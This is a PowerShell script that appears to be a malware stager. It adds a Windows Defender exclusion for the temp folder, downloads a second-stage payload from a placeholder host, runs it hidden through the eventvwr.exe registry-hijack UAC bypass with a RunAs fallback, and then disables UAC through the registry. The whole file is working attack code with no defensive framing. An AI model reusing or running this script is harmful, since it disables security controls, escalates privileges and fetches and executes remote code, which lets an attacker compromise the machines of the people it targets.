# Add Windows Defender exclusion for the temp path
Add-MpPreference -ExclusionPath "$env:TEMP"

$payloadUrl = "http://example.com/Stage2_Payload.ps1"
$tempPath = "$env:TEMP\Stage2_Payload.ps1"

Invoke-WebRequest -Uri $payloadUrl -OutFile $tempPath

# Function to check if running as admin
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Attempt eventvwr.exe UAC bypass
$regPath = 'HKCU:\Software\Classes\mscfile\shell\open\command'
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name '' -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempPath`""
Start-Process 'eventvwr.exe'
Start-Sleep -Seconds 5
Remove-Item 'HKCU:\Software\Classes\mscfile' -Recurse -Force

# Check if now running as admin
if (-not (Test-Admin)) {
    # Fallback: try to run Stage 2 with UAC prompt
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$tempPath`"" -WindowStyle Hidden -Verb RunAs
    exit
}

# If running as admin, attempt to disable UAC
try {
    $uacRegPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    Set-ItemProperty -Path $uacRegPath -Name 'EnableLUA' -Value 0
    Write-Output "UAC disabled. Reboot required for changes to take effect."
} catch {
    Write-Output "Failed to disable UAC: $_"
} 